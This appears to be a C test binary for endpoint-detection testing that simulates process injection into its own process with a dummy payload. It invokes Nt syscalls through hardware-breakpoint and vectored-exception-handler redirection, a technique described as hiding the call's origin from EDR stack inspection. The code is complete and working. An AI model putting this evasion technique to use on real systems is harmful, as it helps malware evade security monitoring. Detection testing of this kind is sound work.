/*
 * TB-INJECT-HWBP.C
 * Test Binary: Process Injection Simulation via Hardware Breakpoint (Invocation Path 4)
 *
 * PURPOSE: Same injection-class operations as all other test binaries but
 * invoked through hardware breakpoint redirection. This technique uses CPU
 * debug registers (DR0-DR3) to intercept execution at a chosen address
 * inside ntdll and redirect it to a custom handler before the hooked
 * code runs.
 *
 * HOW HARDWARE BREAKPOINTS WORK FOR SYSCALL REDIRECTION:
 * 1. Set DR0 = address of target syscall stub in ntdll (e.g. NtAllocateVirtualMemory)
 * 2. Set DR7 to enable the breakpoint in execution mode
 * 3. Register a Vectored Exception Handler (VEH) to catch the EXCEPTION_SINGLE_STEP
 * 4. When execution reaches the ntdll stub, the CPU fires a debug exception
 * 5. VEH intercepts: sets RCX/RDX/R8/R9/stack with our real arguments,
 *    loads the correct SSN into RAX, sets RIP to the syscall instruction in ntdll
 * 6. Resume: CPU executes syscall at ntdll address with our arguments
 *
 * ETW CONSEQUENCE:
 * - The call stack at syscall time shows ntdll as the origin
 * - Different context pointer chain than all other invocation paths
 * - EDR call-stack inspection sees a different (less suspicious) pattern
 * - May generate fewer or different ETW context events
 *
 * COMPILE (MSVC):  cl tb_inject_hwbp.c /Fe:tb_inject_hwbp.exe /MT
 * COMPILE (GCC):   gcc -o tb_inject_hwbp.exe tb_inject_hwbp.c -lntdll
 * TARGET:  x64 Windows 10/11
 * SAFETY:  Own-process target, dummy payload only.
 *
 * NOTE: This technique sets DR registers via SetThreadContext instead of
 * compiler intrinsics for cross-compiler compatibility (GCC/MinGW + MSVC).
 * Debug registers are restored to zero in cleanup.
 */

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#ifndef STATUS_SUCCESS
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#endif

/* SSN table - Windows 10 22H2 Build 19045 */
#define SSN_NtAllocateVirtualMemory  0x0018
#define SSN_NtWriteVirtualMemory     0x003A
#define SSN_NtCreateThreadEx         0x00C1
#define SSN_NtWaitForSingleObject    0x0004
#define SSN_NtFreeVirtualMemory      0x001E
#define SSN_NtClose                  0x000F

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length; HANDLE RootDirectory; PVOID ObjectName;
    ULONG Attributes; PVOID SecurityDescriptor; PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES;
typedef struct _PS_ATTRIBUTE { ULONG_PTR Attribute; SIZE_T Size;
    union { ULONG_PTR Value; PVOID ValuePtr; }; PSIZE_T ReturnLength; } PS_ATTRIBUTE;
typedef struct _PS_ATTRIBUTE_LIST { SIZE_T TotalLength; PS_ATTRIBUTE Attributes[1]; } PS_ATTRIBUTE_LIST;

/* -- Global state for VEH handler ---------------------------------------- */
typedef struct _SYSCALL_CONTEXT {
    DWORD   ssn;           /* Syscall number to load into EAX */
    PVOID   syscall_ret;   /* Address of "syscall; ret" in ntdll */
    BOOL    armed;         /* Is the handler expecting a hit? */
} SYSCALL_CONTEXT;

static SYSCALL_CONTEXT g_ctx = {0};

/* -- Portable DR register manipulation via Get/SetThreadContext ---------- */
static void set_dr0(ULONG_PTR addr) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = addr;
    SetThreadContext(GetCurrentThread(), &ctx);
}

static void set_dr7(ULONG_PTR val) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr7 = val;
    SetThreadContext(GetCurrentThread(), &ctx);
}

static ULONG_PTR get_dr7(void) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    return ctx.Dr7;
}

static void clear_dr_all(void) {
    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    GetThreadContext(GetCurrentThread(), &ctx);
    ctx.Dr0 = 0; ctx.Dr1 = 0; ctx.Dr2 = 0; ctx.Dr3 = 0; ctx.Dr7 = 0;
    SetThreadContext(GetCurrentThread(), &ctx);
}

/* -- Locate "syscall; ret" sequence within a ntdll stub ------------------ */
static PVOID find_syscall_ret(const char *fn_name) {
    BYTE *p = (BYTE*)GetProcAddress(GetModuleHandleA("ntdll.dll"), fn_name);
    if (!p) return NULL;
    for (int i = 0; i < 32; i++) {
        if (p[i] == 0x0F && p[i+1] == 0x05) return p + i;
    }
    return NULL;
}

/*
 * Vectored Exception Handler
 * Called by Windows when DR0 breakpoint fires (EXCEPTION_SINGLE_STEP).
 * We redirect execution to the real syscall instruction.
 */
static LONG CALLBACK hwbp_veh(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode != EXCEPTION_SINGLE_STEP)
        return EXCEPTION_CONTINUE_SEARCH;
    if (!g_ctx.armed)
        return EXCEPTION_CONTINUE_SEARCH;

    PCONTEXT ctx = ep->ContextRecord;

    /*
     * We are now inside the VEH. The CPU stopped execution at the
     * beginning of the ntdll stub (where DR0 was set). We:
     * 1. Load the correct SSN into EAX (same as direct/indirect syscall)
     * 2. Set R10 = RCX (standard x64 syscall calling convention)
     * 3. Set RIP to point at the "syscall" instruction inside ntdll
     * 4. Return CONTINUE_EXECUTION - CPU resumes at our chosen RIP
     */
    ctx->Rax = g_ctx.ssn;
    ctx->R10 = ctx->Rcx;   /* syscall calling convention: r10=arg1 */
    ctx->Rip = (DWORD64)g_ctx.syscall_ret;

    /* Clear armed flag and the DR7 enable bit to avoid re-triggering */
    g_ctx.armed  = FALSE;
    ctx->Dr7    &= ~0x1ULL; /* Disable DR0 local enable */

    return EXCEPTION_CONTINUE_EXECUTION;
}

/* -- Typed wrapper functions that set up HWBP then call ntdll directly --- */
typedef NTSTATUS (NTAPI *pNtAllocateVirtualMemory)(HANDLE,PVOID*,ULONG_PTR,PSIZE_T,ULONG,ULONG);
typedef NTSTATUS (NTAPI *pNtWriteVirtualMemory)(HANDLE,PVOID,PVOID,SIZE_T,PSIZE_T);
typedef NTSTATUS (NTAPI *pNtCreateThreadEx)(PHANDLE,ACCESS_MASK,PVOID,HANDLE,LPTHREAD_START_ROUTINE,PVOID,ULONG,SIZE_T,SIZE_T,SIZE_T,PVOID);
typedef NTSTATUS (NTAPI *pNtWaitForSingleObject)(HANDLE,BOOLEAN,PLARGE_INTEGER);
typedef NTSTATUS (NTAPI *pNtFreeVirtualMemory)(HANDLE,PVOID*,PSIZE_T,ULONG);
typedef NTSTATUS (NTAPI *pNtClose)(HANDLE);

static HMODULE  g_ntdll  = NULL;
static PVOID    g_sc_ret = NULL;

/*
 * ARM_HWBP macro: sets DR0 to the ntdll stub address, configures DR7 for
 * execution breakpoint, and arms the VEH handler with the target SSN.
 */
#define ARM_HWBP(fn_name, target_ssn) do { \
    PVOID stub = (PVOID)GetProcAddress(g_ntdll, fn_name); \
    set_dr0((ULONG_PTR)stub); \
    ULONG_PTR _dr7 = get_dr7(); \
    _dr7 |= 0x1; \
    _dr7 &= ~(0x3ULL<<16); \
    set_dr7(_dr7); \
    g_ctx.ssn = (target_ssn); \
    g_ctx.syscall_ret = g_sc_ret; \
    g_ctx.armed = TRUE; \
} while(0)

#define DISARM_HWBP() do { \
    ULONG_PTR _dr7 = get_dr7(); \
    _dr7 &= ~0x1ULL; \
    set_dr7(_dr7); \
    g_ctx.armed = FALSE; \
} while(0)

static const unsigned char DUMMY_PAYLOAD[] = { 0x90, 0x90, 0x90, 0xC3 };

int main(void) {
    DWORD pid = GetCurrentProcessId();
    printf("[*] TB-INJECT-HWBP starting. PID=%lu\n", pid);
    printf("[*] Invocation path: Hardware Breakpoint Redirect (DR0 interception)\n");

    g_ntdll  = GetModuleHandleA("ntdll.dll");
    g_sc_ret = find_syscall_ret("NtAllocateVirtualMemory");
    if (!g_sc_ret) {
        fprintf(stderr, "[-] Could not find syscall ret sequence in ntdll\n");
        return 1;
    }
    printf("[+] syscall;ret located at 0x%p in ntdll\n", g_sc_ret);

    /* Register our VEH */
    PVOID veh = AddVectoredExceptionHandler(1, hwbp_veh);
    if (!veh) { fprintf(stderr, "[-] AddVectoredExceptionHandler failed\n"); return 1; }
    printf("[+] VEH registered\n");

    NTSTATUS status;
    HANDLE   hProcess = GetCurrentProcess(); /* Use pseudo-handle for simplicity */
    PVOID    pRemote  = NULL;
    HANDLE   hThread  = NULL;
    SIZE_T   allocSz  = 4096;
    SIZE_T   written  = 0;

    OBJECT_ATTRIBUTES oa = { sizeof(OBJECT_ATTRIBUTES), 0, 0, 0, 0, 0 };

    /* Step 1: NtAllocateVirtualMemory via HWBP */
    pNtAllocateVirtualMemory NtAVM = (pNtAllocateVirtualMemory)
                                      GetProcAddress(g_ntdll, "NtAllocateVirtualMemory");
    ARM_HWBP("NtAllocateVirtualMemory", SSN_NtAllocateVirtualMemory);
    status = NtAVM(hProcess, &pRemote, 0, &allocSz,
                   MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    DISARM_HWBP();
    if (!NT_SUCCESS(status)) { fprintf(stderr,"[-] NtAllocateVirtualMemory(hwbp): 0x%08lX\n",status); return 1; }
    printf("[+] NtAllocateVirtualMemory OK (hwbp)  addr=0x%p\n", pRemote);

    /* Step 2: NtWriteVirtualMemory via HWBP */
    pNtWriteVirtualMemory NtWVM = (pNtWriteVirtualMemory)
                                   GetProcAddress(g_ntdll, "NtWriteVirtualMemory");
    ARM_HWBP("NtWriteVirtualMemory", SSN_NtWriteVirtualMemory);
    status = NtWVM(hProcess, pRemote, (PVOID)DUMMY_PAYLOAD, sizeof(DUMMY_PAYLOAD), &written);
    DISARM_HWBP();
    if (!NT_SUCCESS(status)) { fprintf(stderr,"[-] NtWriteVirtualMemory(hwbp): 0x%08lX\n",status); return 1; }
    printf("[+] NtWriteVirtualMemory OK (hwbp)  written=%zu\n", written);

    /* Step 3: NtCreateThreadEx via HWBP */
    pNtCreateThreadEx NtCTEx = (pNtCreateThreadEx)
                                GetProcAddress(g_ntdll, "NtCreateThreadEx");
    ARM_HWBP("NtCreateThreadEx", SSN_NtCreateThreadEx);
    status = NtCTEx(&hThread, THREAD_ALL_ACCESS, &oa, hProcess,
                    (LPTHREAD_START_ROUTINE)pRemote,
                    NULL, 0, 0, 0, 0, NULL);
    DISARM_HWBP();
    if (!NT_SUCCESS(status)) { fprintf(stderr,"[-] NtCreateThreadEx(hwbp): 0x%08lX\n",status); return 1; }
    printf("[+] NtCreateThreadEx OK (hwbp)  handle=0x%p\n", (void*)hThread);

    /* Step 4: Wait */
    pNtWaitForSingleObject NtWSO = (pNtWaitForSingleObject)
                                    GetProcAddress(g_ntdll, "NtWaitForSingleObject");
    LARGE_INTEGER timeout; timeout.QuadPart = -50000000LL;
    ARM_HWBP("NtWaitForSingleObject", SSN_NtWaitForSingleObject);
    NtWSO(hThread, FALSE, &timeout);
    DISARM_HWBP();

    /* Cleanup */
    pNtClose NtCl = (pNtClose)GetProcAddress(g_ntdll, "NtClose");
    NtCl(hThread);
    pNtFreeVirtualMemory NtFVM = (pNtFreeVirtualMemory)
                                  GetProcAddress(g_ntdll, "NtFreeVirtualMemory");
    SIZE_T freeSz = 0;
    ARM_HWBP("NtFreeVirtualMemory", SSN_NtFreeVirtualMemory);
    NtFVM(hProcess, &pRemote, &freeSz, MEM_RELEASE);
    DISARM_HWBP();

    /* Remove VEH and clear debug registers */
    RemoveVectoredExceptionHandler(veh);
    clear_dr_all();

    printf("[*] TB-INJECT-HWBP complete.\n");
    printf("RESULT:SUCCESS:HWBP:%lu\n", pid);
    return 0;
}
